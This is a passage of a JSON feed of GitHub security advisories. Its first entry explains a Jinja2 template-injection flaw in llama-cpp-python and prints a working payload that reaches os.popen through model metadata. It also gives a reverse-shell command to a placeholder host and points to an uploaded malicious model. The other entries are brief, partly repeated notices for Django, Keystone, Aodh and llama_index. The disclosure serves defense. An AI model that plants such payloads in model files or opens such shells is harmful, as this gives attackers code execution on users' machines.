id=\"llamapy---class-llama---__init__\"><code>llama.py</code> -&gt; <code>class Llama</code> -&gt; <code>__init__</code>:</h3>\n<pre><code class=\"language-python\">class Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n        # lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n        # Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n</code></pre>\n<p>In <code>llama.py</code>, <code>llama-cpp-python</code> defined the fundamental class for model initialization parsing (Including <code>NUMA, LoRa settings</code>, <code>loading tokenizers,</code> and stuff ). In our case, we will be focusing on the parts where it processes <code>metadata</code>; it first checks if <code>chat_format</code> and <code>chat_handler</code> are <code>None</code> and checks if the key <code>tokenizer.chat_template</code> exists in the metadata dictionary <code>self.metadata</code>. If it exists, it will try to guess the <code>chat format</code> from the <code>metadata</code>. If the guess fails, it will get the value of <code>chat_template</code> directly from <code>self.metadata.self.metadata</code> is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the <code>chat_template</code> is parsed into <code>llama_chat_format.Jinja2ChatFormatter</code> as params which furthermore stored the <code>to_chat_handler()</code> as <code>chat_handler</code></p>\n<h3 id=\"llama_chat_formatpy---jinja2chatformatter\"><code>llama_chat_format.py</code> -&gt; <code>Jinja2ChatFormatter</code>:</h3>\n<p><code>self._environment =  jinja2.Environment( -&gt; from_string(self.template) -&gt; self._environment.render(</code></p>\n<pre><code class=\"language-python\">class ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -&gt; ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -&gt; ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n</code></pre>\n<p>As we can see in <code>llama_chat_format.py</code> -&gt; <code>Jinja2ChatFormatter</code>, the constructor <code>__init__</code> initialized required <code>members</code> inside of the class; Nevertheless, focusing on this line:</p>\n<pre><code class=\"language-python\">        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n</code></pre>\n<p>Fun thing here: <code>llama_cpp_python</code> directly loads the <code>self.template</code> (<code>self.template = template</code> which is the <code>chat template</code> located in the <code>Metadate</code> that is parsed as a param) via <code>jinja2.Environment.from_string(</code> without setting any sandbox flag or using the protected <code>immutablesandboxedenvironment </code>class. This is extremely unsafe since the attacker can implicitly tell <code>llama_cpp_python</code> to load malicious <code>chat template</code> which is furthermore rendered in the <code>__call__</code> constructor, allowing RCEs or Denial-of-Service since <code>jinja2</code>'s renderer evaluates embed codes like <code>eval()</code>, and we can utilize expose method by exploring the attribution such as <code>__globals__</code>, <code>__subclasses__</code> of pretty much anything.</p>\n<pre><code class=\"language-python\">    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -&gt; ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n</code></pre>\n<h2 id=\"exploiting\">Exploiting</h2>\n<p>For our exploitation, we first downloaded <a href=\"https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf\">qwen1_5-0_5b-chat-q2_k.gguf</a> of <code>Qwen/Qwen1.5-0.5B-Chat-GGUF</code> on <code>huggingface</code> as the base of the exploitation, by importing the file to <code>Hex-compatible</code> editors (In my case I used the built-in <code>Hex editor</code> or <code>vscode</code>), you can try to search for key <code>chat_template</code> (imported as <code>template = self.metadata[\"tokenizer.chat_template\"]</code> in <code>llama-cpp-python</code>):</p>\n<img style=\"zoom: 25%;\" alt=\"image-20240502180804562\" src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\">\n\n<p><code>qwen1_5-0_5b-chat-q2_k.gguf</code> appears to be using the OG <code>role+message</code> and using the fun <code>jinja2</code> syntax. By first replacing the original <code>chat_template</code> in <code>\\x00</code>, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression <code>().__class__.__base__.__subclasses__()</code> retrieves a list of all subclasses of the basic <code>object</code> class and then we check if its <code>warning</code> by <code>if \"warning\" in x.__name__</code>, if it is , we access its module via the <code>_module</code> attribute then access Python's built-in functions through <code>__builtins__</code> and uses the <code>__import__</code> function to import the <code>os</code> module and finally we called <code>os.popen</code> to <code>touch /tmp/retr0reg</code>, create an empty file call <code>retr0reg</code> under <code>/tmp/</code></p>\n<pre><code class=\"language-python\">{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n</code></pre>\n<p>in real life exploiting instance, we can change <code>touch /tmp/retr0reg</code> into arbitrary codes like <code>sh -i &gt;&amp; /dev/tcp/&lt;HOST&gt;/&lt;PORT&gt; 0&gt;&amp;1</code> to create a reverse shell connection to specified host, in our case we are using <code>touch /tmp/retr0reg</code> to showcase the exploitability of this vulnerability.</p>\n<img style=\"zoom:50%;\" alt=\"image-20240502200909127\" src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\">\n\n<p>After these steps, we got ourselves a malicious model with an embedded payload in <code>chat_template</code> of the <code>metahead</code>, in which will be parsed and rendered by <code>llama.py:class Llama:init -&gt;  self.chat_handler </code>-&gt; <code>llama_chat_format.py:Jinja2ChatFormatter:init -&gt;  self._environment = jinja2.Environment(</code> -&gt; ``llama_chat_format.py:Jinja2ChatFormatter:call -&gt; self._environment.render(`</p>\n<p><em>(The uploaded malicious model file is in <a href=\"https://huggingface.co/Retr0REG/Whats-up-gguf\">https://huggingface.co/Retr0REG/Whats-up-gguf</a> )</em></p>\n<pre><code class=\"language-python\">from llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n</code></pre>\n<p>Now when the model is loaded whether as <code> Llama.from_pretrained</code> or <code>Llama</code> and chatted, our malicious code in the <code>chat_template</code> of the <code>metahead</code> will be triggered and execute arbitrary code. </p>\n<p>PoC video here: <a href=\"https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\">https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/abetlen/llama-cpp-python/security/advisories/GHSA-56xg-wfcc-g829\">https://github.com/abetlen/llama-cpp-python/security/advisories/GHSA-56xg-wfcc-g829</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34359\">https://nvd.nist.gov/vuln/detail/CVE-2024-34359</a></li>\n<li><a href=\"https://github.com/abetlen/llama-cpp-python/commit/b454f40a9a1787b2b5659cd2cb00819d983185df\">https://github.com/abetlen/llama-cpp-python/commit/b454f40a9a1787b2b5659cd2cb00819d983185df</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-56xg-wfcc-g829\">https://github.com/advisories/GHSA-56xg-wfcc-g829</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-56xg-wfcc-g829",
            "title": "[llama-cpp-python] llama-cpp-python vulnerable to Remote Code Execution by Server-Side Template Injection in Model Metadata",
            "date_modified": "2024-05-28T17:58:37.000Z",
            "date_published": "2024-05-13T14:10:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-56xg-wfcc-g829"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A command injection vulnerability exists in the RunGptLLM class of the llama_index library, version 0.9.47, used by the RunGpt framework from JinaAI to connect to Language Learning Models (LLMs). The vulnerability arises from the improper use of the eval function, allowing a malicious or compromised LLM hosting provider to execute arbitrary commands on the client's machine. This issue was fixed in version 0.10.13. The exploitation of this vulnerability could lead to a hosting provider gaining full control over client machines.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4181\">https://nvd.nist.gov/vuln/detail/CVE-2024-4181</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/d73715eaf0642705583e7897c78b9c8dd2d3a7ba\">https://github.com/run-llama/llama_index/commit/d73715eaf0642705583e7897c78b9c8dd2d3a7ba</a></li>\n<li><a href=\"https://huntr.com/bounties/1a204520-598a-434e-b13d-0d34f2a5ddc1\">https://huntr.com/bounties/1a204520-598a-434e-b13d-0d34f2a5ddc1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pw38-xv9x-h8ch\">https://github.com/advisories/GHSA-pw38-xv9x-h8ch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pw38-xv9x-h8ch",
            "title": "[llama-index-llms-rungpt] RunGptLLM class in LlamaIndex has a command injection",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2024-05-16T09:33:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pw38-xv9x-h8ch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A command injection vulnerability exists in the RunGptLLM class of the llama_index library, version 0.9.47, used by the RunGpt framework from JinaAI to connect to Language Learning Models (LLMs). The vulnerability arises from the improper use of the eval function, allowing a malicious or compromised LLM hosting provider to execute arbitrary commands on the client's machine. This issue was fixed in version 0.10.13. The exploitation of this vulnerability could lead to a hosting provider gaining full control over client machines.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4181\">https://nvd.nist.gov/vuln/detail/CVE-2024-4181</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/d73715eaf0642705583e7897c78b9c8dd2d3a7ba\">https://github.com/run-llama/llama_index/commit/d73715eaf0642705583e7897c78b9c8dd2d3a7ba</a></li>\n<li><a href=\"https://huntr.com/bounties/1a204520-598a-434e-b13d-0d34f2a5ddc1\">https://huntr.com/bounties/1a204520-598a-434e-b13d-0d34f2a5ddc1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pw38-xv9x-h8ch\">https://github.com/advisories/GHSA-pw38-xv9x-h8ch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pw38-xv9x-h8ch",
            "title": "[llama-index] RunGptLLM class in LlamaIndex has a command injection",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2024-05-16T09:33:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pw38-xv9x-h8ch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The XML libraries for Python as used in OpenStack Keystone Essex and Folsom, Django, and possibly other products allow remote attackers to read arbitrary files via an XML external entity declaration in conjunction with an entity reference, aka an XML External Entity (XXE) attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2013-1665\">https://nvd.nist.gov/vuln/detail/CVE-2013-1665</a></li>\n<li><a href=\"https://bugs.launchpad.net/keystone/+bug/1100279\">https://bugs.launchpad.net/keystone/+bug/1100279</a></li>\n<li><a href=\"http://blog.python.org/2013/02/announcing-defusedxml-fixes-for-xml.html\">http://blog.python.org/2013/02/announcing-defusedxml-fixes-for-xml.html</a></li>\n<li><a href=\"http://bugs.python.org/issue17239\">http://bugs.python.org/issue17239</a></li>\n<li><a href=\"http://lists.openstack.org/pipermail/openstack-announce/2013-February/000078.html\">http://lists.openstack.org/pipermail/openstack-announce/2013-February/000078.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0657.html\">http://rhn.redhat.com/errata/RHSA-2013-0657.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0658.html\">http://rhn.redhat.com/errata/RHSA-2013-0658.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0670.html\">http://rhn.redhat.com/errata/RHSA-2013-0670.html</a></li>\n<li><a href=\"http://ubuntu.com/usn/usn-1757-1\">http://ubuntu.com/usn/usn-1757-1</a></li>\n<li><a href=\"http://www.debian.org/security/2013/dsa-2634\">http://www.debian.org/security/2013/dsa-2634</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2013/02/19/2\">http://www.openwall.com/lists/oss-security/2013/02/19/2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2013/02/19/4\">http://www.openwall.com/lists/oss-security/2013/02/19/4</a></li>\n<li><a href=\"https://github.com/django/django/commit/1c60d07ba23e0350351c278ad28d0bd5aa410b40\">https://github.com/django/django/commit/1c60d07ba23e0350351c278ad28d0bd5aa410b40</a></li>\n<li><a href=\"https://github.com/django/django/commit/d19a27066b2247102e65412aa66917aff0091112\">https://github.com/django/django/commit/d19a27066b2247102e65412aa66917aff0091112</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x64m-686f-fmm3\">https://github.com/advisories/GHSA-x64m-686f-fmm3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x64m-686f-fmm3",
            "title": "[Django] XML External Entity (XXE) in Django",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2022-05-17T05:09:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x64m-686f-fmm3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The XML libraries for Python as used in OpenStack Keystone Essex and Folsom, Django, and possibly other products allow remote attackers to read arbitrary files via an XML external entity declaration in conjunction with an entity reference, aka an XML External Entity (XXE) attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2013-1665\">https://nvd.nist.gov/vuln/detail/CVE-2013-1665</a></li>\n<li><a href=\"https://bugs.launchpad.net/keystone/+bug/1100279\">https://bugs.launchpad.net/keystone/+bug/1100279</a></li>\n<li><a href=\"http://blog.python.org/2013/02/announcing-defusedxml-fixes-for-xml.html\">http://blog.python.org/2013/02/announcing-defusedxml-fixes-for-xml.html</a></li>\n<li><a href=\"http://bugs.python.org/issue17239\">http://bugs.python.org/issue17239</a></li>\n<li><a href=\"http://lists.openstack.org/pipermail/openstack-announce/2013-February/000078.html\">http://lists.openstack.org/pipermail/openstack-announce/2013-February/000078.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0657.html\">http://rhn.redhat.com/errata/RHSA-2013-0657.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0658.html\">http://rhn.redhat.com/errata/RHSA-2013-0658.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0670.html\">http://rhn.redhat.com/errata/RHSA-2013-0670.html</a></li>\n<li><a href=\"http://ubuntu.com/usn/usn-1757-1\">http://ubuntu.com/usn/usn-1757-1</a></li>\n<li><a href=\"http://www.debian.org/security/2013/dsa-2634\">http://www.debian.org/security/2013/dsa-2634</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2013/02/19/2\">http://www.openwall.com/lists/oss-security/2013/02/19/2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2013/02/19/4\">http://www.openwall.com/lists/oss-security/2013/02/19/4</a></li>\n<li><a href=\"https://github.com/django/django/commit/1c60d07ba23e0350351c278ad28d0bd5aa410b40\">https://github.com/django/django/commit/1c60d07ba23e0350351c278ad28d0bd5aa410b40</a></li>\n<li><a href=\"https://github.com/django/django/commit/d19a27066b2247102e65412aa66917aff0091112\">https://github.com/django/django/commit/d19a27066b2247102e65412aa66917aff0091112</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x64m-686f-fmm3\">https://github.com/advisories/GHSA-x64m-686f-fmm3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x64m-686f-fmm3",
            "title": "[Django] XML External Entity (XXE) in Django",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2022-05-17T05:09:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x64m-686f-fmm3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The verify_exists functionality in the URLField implementation in Django before 1.2.7 and 1.3.x before 1.3.1 relies on Python libraries that attempt access to an arbitrary URL with no timeout, which allows remote attackers to cause a denial of service (resource consumption) via a URL associated with (1) a slow response, (2) a completed TCP connection with no application data sent, or (3) a large amount of application data, a related issue to CVE-2011-1521.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4137\">https://nvd.nist.gov/vuln/detail/CVE-2011-4137</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=737366\">https://bugzilla.redhat.com/show_bug.cgi?id=737366</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3jqw-crqj-w8qw\">https://github.com/advisories/GHSA-3jqw-crqj-w8qw</a></li>\n<li><a href=\"https://hermes.opensuse.org/messages/14700881\">https://hermes.opensuse.org/messages/14700881</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/11/1\">http://openwall.com/lists/oss-security/2011/09/11/1</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/13/2\">http://openwall.com/lists/oss-security/2011/09/13/2</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/15/5\">http://openwall.com/lists/oss-security/2011/09/15/5</a></li>\n<li><a href=\"http://secunia.com/advisories/46614\">http://secunia.com/advisories/46614</a></li>\n<li><a href=\"http://www.debian.org/security/2011/dsa-2332\">http://www.debian.org/security/2011/dsa-2332</a></li>\n<li><a href=\"https://github.com/django/django/commit/1a76dbefdfc60e2d5954c0ba614c3d054ba9c3f0\">https://github.com/django/django/commit/1a76dbefdfc60e2d5954c0ba614c3d054ba9c3f0</a></li>\n<li><a href=\"https://github.com/django/django/commit/7268f8af86186518821d775c530d5558fd726930\">https://github.com/django/django/commit/7268f8af86186518821d775c530d5558fd726930</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/09\">https://www.djangoproject.com/weblog/2011/sep/09</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/10/127\">https://www.djangoproject.com/weblog/2011/sep/10/127</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3jqw-crqj-w8qw",
            "title": "[django] Denial of service in django",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2018-07-23T19:51:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3jqw-crqj-w8qw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The verify_exists functionality in the URLField implementation in Django before 1.2.7 and 1.3.x before 1.3.1 relies on Python libraries that attempt access to an arbitrary URL with no timeout, which allows remote attackers to cause a denial of service (resource consumption) via a URL associated with (1) a slow response, (2) a completed TCP connection with no application data sent, or (3) a large amount of application data, a related issue to CVE-2011-1521.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-4137\">https://nvd.nist.gov/vuln/detail/CVE-2011-4137</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=737366\">https://bugzilla.redhat.com/show_bug.cgi?id=737366</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3jqw-crqj-w8qw\">https://github.com/advisories/GHSA-3jqw-crqj-w8qw</a></li>\n<li><a href=\"https://hermes.opensuse.org/messages/14700881\">https://hermes.opensuse.org/messages/14700881</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/11/1\">http://openwall.com/lists/oss-security/2011/09/11/1</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/13/2\">http://openwall.com/lists/oss-security/2011/09/13/2</a></li>\n<li><a href=\"http://openwall.com/lists/oss-security/2011/09/15/5\">http://openwall.com/lists/oss-security/2011/09/15/5</a></li>\n<li><a href=\"http://secunia.com/advisories/46614\">http://secunia.com/advisories/46614</a></li>\n<li><a href=\"http://www.debian.org/security/2011/dsa-2332\">http://www.debian.org/security/2011/dsa-2332</a></li>\n<li><a href=\"https://github.com/django/django/commit/1a76dbefdfc60e2d5954c0ba614c3d054ba9c3f0\">https://github.com/django/django/commit/1a76dbefdfc60e2d5954c0ba614c3d054ba9c3f0</a></li>\n<li><a href=\"https://github.com/django/django/commit/7268f8af86186518821d775c530d5558fd726930\">https://github.com/django/django/commit/7268f8af86186518821d775c530d5558fd726930</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/09\">https://www.djangoproject.com/weblog/2011/sep/09</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2011/sep/10/127\">https://www.djangoproject.com/weblog/2011/sep/10/127</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3jqw-crqj-w8qw",
            "title": "[django] Denial of service in django",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2018-07-23T19:51:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3jqw-crqj-w8qw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Aodh as packaged in Openstack Ocata and Newton before change-ID I8fd11a7f9fe3c0ea5f9843a89686ac06713b7851 and before Pike-rc1 does not verify that trust IDs belong to the user when creating alarm action with the scheme trust+http, which allows remote authenticated users with knowledge of trust IDs where Aodh is the trustee to obtain a Keystone token and perform unspecified authenticated actions by adding an alarm action with the scheme trust+http, and providing a trust id where Aodh is the trustee.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-12440\">https://nvd.nist.gov/vuln/detail/CVE-2017-12440</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2017:3227\">https://access.redhat.com/errata/RHSA-2017:3227</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:0315\">https://access.redhat.com/errata/RHSA-2018:0315</a></li>\n<li><a href=\"https://bugs.launchpad.net/ossn/+bug/1649333\">https://bugs.launchpad.net/ossn/+bug/1649333</a></li>\n<li><a href=\"http://www.debian.org/security/2017/dsa-3953\">http://www.debian.org/security/2017/dsa-3953</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/100455\">http://www.securityfocus.com/bid/100455</a></li>\n<li><a href=\"https://github.com/openstack/aodh/commit/149d3ad2193b4d17df801f82a0a6be62dba564db\">https://github.com/openstack/aodh/commit/149d3ad2193b4d17df801f82a0a6be62dba564db</a></li>\n<li><a href=\"https://github.com/openstack/aodh/commit/92182de328d1f088c5f5a68326d2b207b21e06ea\">https://github.com/openstack/aodh/commit/92182de328d1f088c5f5a68326d2b207b21e06ea</a></li>\n<li><a href=\"https://review.openstack.org/#/c/493823\">https://review.openstack.org/#/c/493823</a></li>\n<li><a href=\"https://review.openstack.org/#/c/493824\">https://review.openstack.org/#/c/493824</a></li>\n<li><a href=\"https://review.openstack.org/#/c/493826\">https://review.openstack.org/#/c/493826</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-86cv-9gpx-6hwj\">https://github.com/advisories/GHSA-86cv-9gpx-6hwj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-86cv-9gpx-6hwj",
            "title": "[aodh] Openstack Aodh can be used to launder Keystone trusts",
            "date_modified": "2024-05-24T05:03:43.000Z",
            "date_published": "2022-05-13T01:42:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-86cv-9gpx-6hwj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenStack Identity (Keystone) before 2013.1 allows remote attackers to cause a denial of service (memory consumption and crash) via multiple long requests.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2013-2014\">https://nvd.nist.gov/vuln/detail/CVE-2013-2014</a></li>\n<li><a href=\"https://bugs.launchpad.net/keystone/+bug/1098177\">https://bugs.launchpad.net/keystone/+bug/1098177</a></li>\n<li><a href=\"https://bugs.launchpad.net/keystone/+bug/1099025\">https://bugs.launchpad.net/keystone/+bug/1099025</a></li>\n<li><a href=\"https://exchange.xforce.ibmcloud.com/vulnerabilities/84347\">https://exchange.xforce.ibmcloud.com/vulnerabilities/84347</a></li>\n<li><a href=\"http://lists.fedoraproject.org/pipermail/package-announce/2013-July/111914.html\">http://lists.fedoraproject.org/pipermail/package-announce/2013-July/111914.html</a></li>\n<li><a href=\"http://secunia.com/advisories/53397\">http://secunia.com/advisories/53397</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/59936\">http://www.securityfocus.com/bid/59936</a></li>\n<li><a href=\"https://github.com/openstack/keystone/commit/7691276b869a86c2b75631d5bede9f61e030d9d8\">https://github.com/openstack/keystone/commit/7691276b869a86c2b75631d5bede9f61e030d9d8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7332-36h8-8jh8\">https://github.com/advisories/GHSA-7332-36h8-8jh8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7332-36h8-8jh8",
            "title": "[keystone] OpenStack Identity (Keystone) Denial of Service",
            "date_modified": "2024-05-24T05:03:42.000Z",
            "date_published": "2022-05-13T01:26:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7332-36h8-8jh8"
            },
            "tags": [
                "severity"
            ]
        },
        {
